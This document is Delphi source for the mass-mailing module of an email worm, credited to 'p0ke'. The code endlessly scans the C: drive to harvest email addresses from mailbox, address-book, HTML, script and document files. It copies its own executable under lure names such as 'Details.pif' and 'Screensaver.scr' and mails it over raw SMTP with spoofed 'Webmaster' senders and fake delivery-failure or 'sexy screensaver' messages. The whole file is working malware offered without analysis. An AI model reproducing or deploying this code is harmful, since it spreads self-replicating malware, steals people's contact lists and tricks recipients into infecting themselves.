(* created by p0ke, using positrons units *)
unit massmail_spreader;

interface

uses
  Windows, Winsock, ShellAPI, mxResolver, scan_spread;

Type
  TMailSettings = Record
    Subject     :String;
    Body        :String;
    Attachment  :String;
    From        :String;
    FromMail    :String;
  End;

Const
  MailSettings: Array[0..9] Of TMailSettings = (
  (Subject:'Test';Body:'Test';Attachment:'Test.exe';From:'%rand%';FromMail:'%rand%'),
  (Subject:'Test';Body:'';Attachment:'Test.pif';From:'%rand%';FromMail:'%to%'),
  (Subject:'Mail Deliviry Failure';Body:'Your mail couldnt be delivered, please check the attachment for info';Attachment:'Details.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Mail Encoded';Body:'Mail is encoded, check attachment for decrypted mail';Attachment:'Decrypted_mail.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Mail Authentification';Body:'You have received an extended message. Please read the instructions.New message is available.';Attachment:'Message.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Message Error';Body:'Follow the instructions to read the message';Attachment:'Instructions-howtofix.txt.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Protected Mail Delivery';Body:'SMTP: Please confirm the attached message.';Attachment:'Confirm.exe.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Mail Authentication';Body:'Protected message is attached.';Attachment:'Protected.Storage.Encrypted.XOR.34h.pif';From:'Webmaster';FromMail:'Webmaster@%domain%'),
  (Subject:'Hello there :)';Body:'Check what i found. Its saved in PIF format (Picture image Format)';Attachment:'haha.pif';From:'%rand%';FromMail:'%rand%'),
  (Subject:'Sexy Screensaver For You, delivered by a friend.';Body:'Someone sent you a sexy screensaver.';Attachment:'Screensaver.scr';From:'Dont Reply';FromMail:'autoemail@screensaver.com')
  );

  MailNames: Array[0..9] Of String = (
  'Bill', 'Jen', 'Kenny', 'Nisse', 'Peter',
  'Johnny', 'Frans', 'Clark', 'Lenny', 'Sofia');

  MailDomains: Array[0..9] Of String = (
  'hotmail.com', 'yahoo.com', 'gmail.com', 'fastmail.com', 'extendedmail.com',
  'powermail.com', 'directnews.com', 'microsoft.com', 'amail.com', 'mailish.com');

var
  Mails: String;

  Procedure StartMassMail;
implementation

PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString);
VAR
  PIn     : Pointer;
  POut    : Pointer;
  InSize  : Cardinal;
  OutSize : Cardinal;

  PROCEDURE Base64Encode2(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
  CONST
    cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  VAR
    ByThrees : Cardinal;
    LeftOver : Cardinal;
    Line     : Word;
  ASM
    mov ESI,[EAX]
    mov EDI,[ECX]
    mov EAX,EBX
    mov ECX,$03
    xor EDX,EDX
    div ECX
    mov ByThrees,EAX
    mov LeftOver,EDX
    lea ECX,cBase64Codec[0]
    xor EAX,EAX
    xor EBX,EBX
    xor EDX,EDX
    cmp ByThrees,0
    jz  @@LeftOver
    mov Line,0
    @@LoopStart:
    inc Line
    LODSW
    mov BL,AL
    shr BL,2
    mov DL,BYTE PTR [ECX+EBX]
    mov BH,AH
    and BH,$0F
    rol AX,4
    and AX,$3F
    mov DH,BYTE PTR [ECX+EAX]
    mov AX,DX
    STOSW
    LODSB
    mov BL,AL
    shr BX,6
    mov DL,BYTE PTR [ECX+EBX]
    and AL,$3F
    xor AH,AH
    mov DH,BYTE PTR [ECX+EAX]
    mov AX,DX
    STOSW
    cmp Line,19
    jnz @@ugor
    mov AX,$0A0D
    STOSW
    mov Line,0
    @@ugor:
    dec ByThrees
    jnz @@LoopStart
    @@LeftOver:
    cmp LeftOver, 0
    jz  @@Done
    xor EAX,EAX
    xor EBX,EBX
    xor EDX,EDX
    LODSB
    shl AX,6
    mov BL,AH
    mov DL,BYTE PTR [ECX+EBX]
    dec LeftOver
    jz  @@SaveOne
    shl AX,2
    and AH,$03
    LODSB
    shl AX,4
    mov BL,AH
    mov DH,BYTE PTR [ECX+EBX]
    shl EDX,16
    shr AL,2
    mov BL,AL
    mov DL,BYTE PTR [ECX+EBX]
    mov DH,'='
    jmp @@WriteLast4
    @@SaveOne:
    shr AL,2
    mov BL,AL
    mov DH,BYTE PTR [ECX+EBX]
    shl EDX,16
    mov DH,'='
    mov DL,'='
    @@WriteLast4:
    mov EAX,EDX
    ror EAX,16
    STOSD
    @@Done:
  END;

BEGIN
  InSize:=Length(InText);
  OutSize:=(InSize DIV 3) SHL 2;
  IF InSize MOD 3>0 THEN Inc(OutSize,4);
  Outsize:=Outsize+Outsize DIV 20;
  SetLength(OutText,OutSize);
  PIn:=@InText[1];
  POut:=@OutText[1];
  Base64Encode2(PIn,InSize,POut);
END;

Procedure WriteBat(bName, bText: String; Run: Bool);
Var
  F:    TextFile;
Begin
  AssignFile(F, bName);
  ReWrite(F);
  WriteLn(F, bText);
  WriteLn(F, 'del '+bName);
  CloseFile(F);

  If (Run) Then
    ShellExecute(0, 'open', pChar(bName), nil, nil, 0);
End;

Function GetRegValue(Root: HKey; Path, Value: String): String;
Var
  Key:  HKey;
  Siz:  Cardinal;
  Val:  Array[0..16382] Of Char;
Begin
  Try
  //------------------------------
    ZeroMemory(@Val, SizeOf(Val));
    Siz := 16382;

    RegOpenKeyEx(Root, pChar(Path), 0, REG_SZ, KEY);
    RegQueryValueEx(KEY, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(KEY);

    If (Val <> '') Then
      Result := Val;
  //------------------------------
  Except
    Result := '';
  End;
End;

Function ZipIt(fName: String): Boolean;
Var
  zipPath       :String;
  zipString     :String;
  zipExist      :Bool;
Begin
  Result := False;

  zipString := '" -a -r "' + Copy(fName, 1, Length(fName)-4) + '" "' + fName + '"';
  zipExist := False;

  If (GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '') <> '') Then
  Begin
    zipExist := True;
    zipPath := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '');
  End;

  If (zipExist) Then
  Begin
    zipString := '"' + zipPath + zipString;
    writeBat('C:\Zip.Bat', zipString, True);
  End;
End;

function InttoStr(const Value: integer): string; var S: string[11];
begin Str(Value, S); Result := S; end;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

FUNCTION NameToIP(HostName:STRING) : STRING;
TYPE
  TAPInAddr = ARRAY [0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  I          : Integer;
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(pChar(HostName));
    IF HostEntPtr<>NIL THEN BEGIN
      pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
      I:=0;
      WHILE pptr^[I]<>NIL DO BEGIN
        Result:=(inet_ntoa(pptr^[I]^));
        Inc(I);
      END;
    END;
  EXCEPT
  END;
  WSACleanUp();
END;

Function rndMail(Int: Integer): String;
Begin Result := MailNames[Int]+'@'+MailDomains[Int]; End;

Function rndName(Int: Integer): String;
Begin Result := MailNames[Int]; End;

Function MailSend(mailTo: String; SMTP: String): Bool;
Var
  Domain        :String;
  Attachment    :String;
  Body          :String;
  From          :String;
  FromMail      :String;
  Subject       :String;
  Rnd           :String;
  Rand          :Integer;
  MX            :TMXResolver;
  I             :Integer;
  Settings      :TMailSettings;

  Sock          :TSocket;
  WSA           :TWSAData;
  Addr          :TSockAddrIn;
  LocalHost     :Array [0..63] Of Char;

  F             :File;
  FileBuf       :AnsiString;
  SendBuf       :AnsiString;
  Dir           :Array[0..255] of Char;

  Procedure SendData(Text: String; Sock: TSocket);
  Begin Send(Sock, Text[1], Length(Text), 0); End;

  Function MyRecv(Code: String): Bool;
  Var Buf: Array[0..2048] Of Char; Begin
  ZeroMemory(@Buf[0], SizeOf(Buf));
  If (Recv(Sock, Buf, SizeOf(Buf), 0) = Socket_Error) or
  (Copy(Buf, 1, 3) <> Code) Then Result := False Else Result := True;
  End;

Begin
  Result := False;
  If (Pos(mailto, Mails) > 0) Then Exit;
  Mails := Mails+' '+MailTo;
  Randomize;
  Rand := Random(9);

  Domain := Copy(mailTo, Pos('@', mailTo)+1, Length(mailTo));

  Settings := MailSettings[Rand];
  Attachment := Settings.Attachment;
  Body := Settings.Body;
  From := Settings.From;
  FromMail := Settings.FromMail;
  Subject := Settings.Subject;

  GetSystemDirectory(Dir, 256);
  Attachment := String(Dir)+'\'+Attachment;

  CopyFile(pChar(paramstr(0)), pChar(Attachment), False);

  If (ZipIt(Attachment)) Then
    Attachment := Copy(Attachment, 1, Length(Attachment)-4)+'.zip';

  If (from = '%rand%') Then From := rndName(Rand);
  If (fromMail = '%rand%') Then FromMail := rndMail(Rand);
  If (fromMail = '%to%') Then FromMail := mailTo;
  If (fromMail = 'Webmaster@%domain%') Then FromMail := 'Webmaster@'+Domain;

  If (SMTP <> '') Then
  Begin
    MX := TMXResolver.Create('yourmother');
    MX.ListOfSMTPServers.Add(SMTP);
  End Else
    MX := TMXResolver.Create(Domain);

  If (MX.ListOfSMTPServers.Count = 0) Then Exit;

  For I := 0 To MX.ListOfSMTPServers.Count -1 Do
  Begin
    WSAStartUp(MakeWord(2,1), WSA);
      GetHostName(LocalHost, SizeOf(LocalHost));

      Sock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      Addr.sin_family := AF_INET;
      Addr.sin_port := hTons(25);
      Addr.sin_addr.S_addr := inet_addr(pChar(NameToIp(MX.ListOfSMTPServers.Strings(I))));

      If (Connect(Sock, Addr, SizeOf(Addr)) > -1) Then
      Begin
        Rnd := '---' + IntToStr(Random(99999)) + '--' + IntToStr(Random(99999999)) + '-';

        If (Not MyRecv('220')) Then Break;
          SendData('HELO '+LocalHost+#13#10, Sock);
        If (Not MyRecv('250')) Then Break;
          SendData('MAIL FROM: <'+FromMail+'>'#13#10, Sock);
        If (Not MyRecv('250')) Then Break;
          SendData('RCPT TO: <'+mailTo+'>'#13#10, Sock);
        If (Not MyRecv('250')) Then Break;
          SendData('DATA'#13#10, Sock);
        If (Not MyRecv('354')) Then Break;
          SendData('From: '+From+' <'+FromMail+'>'#13#10+
                   'Subject: '+Subject+#13#10+
                   'MIME-Version: 1.0'#13#10+
                   'Content-Type: multipart/mixed; boundary="'+Rnd+'"'#13#10#13#10+
                   '--'+ Rnd +#13#10+
                   'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                   Body+#13#10#13#10+
                   '--'+ Rnd +#13#10+
                   'Content-Type: application/x-shockwave-flash;'#13#10+
                   ' name="'+ExtractFileName(Attachment)+'"'#13#10+
                   'Content-Transfer-Encoding: base64'#13#10#13#10, Sock);

        AssignFile(F, Attachment);
        FileMode := 0;
        {$I-}
        Reset(F, 1);
        If (IOResult = 0) Then
        Begin
          SetLength(FileBuf, FileSize(F));
          BlockRead(F, FileBuf[1], FileSize(F));
          Base64Encode(FileBuf, SendBuf);
          SendData(SendBuf, Sock);
          CloseFile(F);
        End;
        {$I+}
        SendData(#13#10'--' + Rnd + '--'#13#10'.'#13#10, Sock);
        If (Not MyRecv('250')) Then Break;

        SendData('QUIT'#13#10, Sock);
        Result := True;

        WSACleanUp;
      End;
    End;
End;

// FIND FILES
procedure ReadFileStr(Fname:string;var FullContents:string);
var
 Fcontents:File of Char;
 Fbuffer:array [1..1024] of Char;
 rLen,Fsize:LongInt;
begin
Try
 FullContents:='';

 AssignFile(Fcontents,Fname);
 Reset(Fcontents);
 Fsize:=FileSize(Fcontents);
 while not Eof(Fcontents) do begin
  BlockRead(Fcontents,Fbuffer,1024,rLen);
  FullContents:=FullContents + string(Fbuffer);
 end;
 CloseFile(Fcontents);

 if Length(FullContents) > Fsize then
  FullContents:=Copy(FullContents,1,Fsize);
Except
  ;
End;
end;

Function GetFileSize(FileName: String): int64;
Var
  H: tHandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindCLose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 +
    fData.nFileSizeLow;
  End;
End;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

Procedure DoGather(FileName: String);
Var
  Ch            :String;
  Text          :String;
  Tmp1, Tmp2    :String;

  FileSize      :Integer;
  J             :Integer;
Begin
  If FileName <> '' Then
  Begin
    FileSize := GetFileSize(FileName);
    If FileSize <= ((1024 * 1024) * 5) Then
    Begin
      ReadFileStr(FileName, Text);

      If Pos('@', Text) > 0 Then
      Begin
        Tmp1 := '';
        Tmp2 := '';
        Ch   := '';

        For J := 1 To Length(Text) Do
        Begin
          Ch := Text[J];
          If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
            Tmp1 := Tmp1 + Ch
          Else
          Begin
            If Pos('@', Tmp1) > 0 Then
            Begin
              If (Tmp1 <> '@') And
                 (Tmp1[1] <> '@') And
                 (Tmp1[Length(Tmp1)] <> '@') And
                 (Pos('.', Tmp1) > 0) Then
                   MailSend(Tmp1, '');
              Tmp1 := '';
            End Else
              Tmp1 := '';
          End;
        End;
      End;
    End;
  End;
End;

// .wab
PROCEDURE ReadWAB(WABFile:STRING);
VAR
  F       : FILE;
  I       : DWORD;
  S       : STRING;
  N       : ARRAY[1..5] OF Char;
  Buf     : ARRAY[1..500] OF Char;
  R       : TextFile;
BEGIN
  AssignFile(R,'Emails.txt');
  ReWrite(R);
  AssignFile(F,WABFile);
    {$I-}
    Reset(F,1);
    IF IOResult=0 THEN BEGIN
      REPEAT
        BlockRead(F,N,2);
        IF N[1]+N[2]=#03#48 THEN BEGIN
          BlockRead(F,Buf,Ord(N[2])+30);
          S:='';
          FOR I:=1 TO Ord(N[2])+30 DO S:=S+Buf[I];
          Delete(S,1,3);
          I:=Pos(#00#00#00,S);
          IF I>0 THEN SetLength(S,I-1);
          FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
          FOR I:=1 TO Length(S) DO
            IF S[I]<chr(45) THEN BEGIN
              SetLength(S,I-1);
              Break;
            END;
         IF (Pos('@',S)>0)AND(Pos('.',S)>0) THEN MailSend(S, '');
        END ELSE Seek(F,FilePos(F)-1);
      UNTIL FileSize(F)-FilePos(F)<6;
      CloseFile(F);
    END;
    CloseFile(R);
    {$I+}
END;

// .mbx .tbb .eml .mai .mbox
PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
LABEL
  Abort, Close;
VAR
  F : TextFile;
  S : STRING;
  T : STRING;
  G : STRING;
  K : STRING;
  A : Byte;
  B : Byte;
  C : Byte;
  H : Byte;
  Y : Byte;
BEGIN
  AssignFile(F,FileName);
  {$I-}
  Reset(F);
  IF IOResult<>0 THEN GOTO Abort;
  REPEAT
    ReadLn(F,S);
    IF IOResult<>0 THEN GOTO Close;
    FOR C:=0 TO 3 DO BEGIN
      IF C=0 THEN K:='To: ';
      IF C=1 THEN K:='From: ';
      IF C=2 THEN K:='cc: ';
      IF C=3 THEN K:='Cc: ';
      IF Pos(K,S)=1 THEN BEGIN
        IF C=1 THEN Y:=2 ELSE Y:=0;
        Delete(S,1,Pos(K,S)+3+Y);
        IF Pos('<',S)>0 THEN BEGIN
          H:=0;
          REPEAT
            IF H=1 THEN BEGIN
             H:=0;
              Readln(F,S);
              IF IOResult<>0 THEN GOTO Close;
            END;
            REPEAT
              A:=Pos('<',S);
              B:=Pos('>',S);
              T:=Copy(S,A+1,B-A-1);
              IF Pos('@',T)>0 THEN MailSend(T, '');
             Delete(S,1,B);
            UNTIL Pos('<',S)=0;
            IF Pos(',',S)>0 THEN H:=1;
          UNTIL H=0;
        END ELSE IF Pos('@',S)>0 THEN BEGIN
          IF (C<>1) THEN BEGIN
            G:=S;
            WHILE G[Length(G)]=',' DO BEGIN
              Readln(F,G);
              IF IOResult<>0 THEN GOTO Close;
              S:=S+G;
            END;
            REPEAT
              A:=0;
              REPEAT
                INC(A);
              UNTIL S[A]<>' ';
              G:=Copy(S,A,Pos(',',S)-A);
              Delete(S,1,Pos(',',S));
              IF Pos(' ',G)>0 THEN SetLength(G,Pos(' ',G));
              IF(G<>'')AND(Pos('@',G)>0) THEN MailSend(G, '')
            UNTIL Pos(',',S)=0;
            A:=0;
            REPEAT
              INC(A);
            UNTIL S[A]<>' ';
            Delete(s,1,a-1);
            IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
            IF Pos('@',S)>0 THEN MailSend(S, '')
          END;
        END;
      END;
    END;
  UNTIL EOF(F);
  Close:
  CloseFile(F);
  Abort:
  {$I+}
END;
// FIND FILES

function ExtractFileExt(const Filename: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  If Pos('.', Filename) = 0 Then
  Begin
    Result := '';
    Exit;
  End;
  L := Length(Filename);
  for i := L downto 1 do
  begin
    Ch := Filename[i];
    if (Ch = '.') then
    begin
      Result := Copy(Filename, i + 1, Length(Filename));
      Break;
    end;
  end;
end;

function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

Procedure ScanForMail(Dir: String);
Var
  SearchRec	:TSearchRec;
Begin
  Try
    If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';
    
    If (FindFirst(Dir + '*.*', faDirectory, SearchRec) = 0) Then
    Repeat
      If ((SearchRec.Attr and faDirectory) = faDirectory) and
          (SearchRec.Name[1] <> '.') Then
          Begin
            If (UpperCase(SearchRec.Name) <> 'WINDOWS') and
               (UpperCase(SearchRec.Name) <> 'WINNT') Then
                 ScanForMail(Dir + SearchRec.Name);
          End Else
          Begin
            If (SearchRec.Name[1] <> '.') Then
            Begin
              if (GetFileSize(DIR + SearchRec.Name) < 500000) Then
              Begin
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'MBX')  Then GetEmailsFromMBX_TBB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'TBB')  Then GetEmailsFromMBX_TBB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'EML')  Then GetEmailsFromMBX_TBB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'MAI')  Then GetEmailsFromMBX_TBB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'MBOX') Then GetEmailsFromMBX_TBB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'WAB')  Then ReadWAB(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'TXT')  Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'VBS')  Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'HTM')  Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'HTML') Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'ASP')  Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'PHP')  Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'PL')   Then DoGather(DIR + SearchRec.Name);
                If (UpperCase(ExtractFileExt(SearchRec.Name)) = 'DOC')  Then DoGather(DIR + SearchRec.Name);
              End;
            End;
          End;
      Sleep(512);
    Until (FindNext(SearchRec) <> 0);
    FindClose(SearchRec);
  Except
    FindClose(SearchRec);
    Exit;
  End;
End;

Procedure StartScan;
Begin
  Repeat
    ScanForMail('C:\');
  Until (1=2);
End;

// .mbx .tbb .eml .mai .mbox .wab .txt .vbs .htm .asp .php .pl .doc
Procedure StartMassMail;
Var
  ThreadID      :DWord;
Begin
  CreateThread(NIL, 0, @StartScan, NIL, 0, ThreadID);
End;

end.
